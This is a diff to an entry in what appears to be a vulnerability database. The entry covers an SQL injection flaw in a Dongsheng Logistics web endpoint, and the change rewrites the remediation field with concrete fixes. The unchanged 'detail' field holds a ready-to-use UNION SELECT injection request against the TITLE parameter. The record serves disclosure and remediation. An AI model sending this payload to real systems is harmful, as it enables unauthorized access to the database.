@@ -4,7 +4,7 @@ type = "SQL注入"
 path = "/PriceCarrier/CrmProxyMailListGridSource.aspx"
 version = ""
 detail = "GET /PriceCarrier/CrmProxyMailListGridSource.aspx?handle=list&TITLE=1' UNION SELECT @@version-- HTTP/1.1 Host: target"
-fix = "升级至最新版本"
+fix = "联系东胜物流厂商获取安全补丁；对 CrmProxyMailListGridSource.aspx 的 TITLE 参数实施参数化查询；限制该接口仅允许内网访问；WAF 拦截 SQL 注入特征。"
 date = 20260401
 label = "nday"
 cve = "TVD-2026-07472"
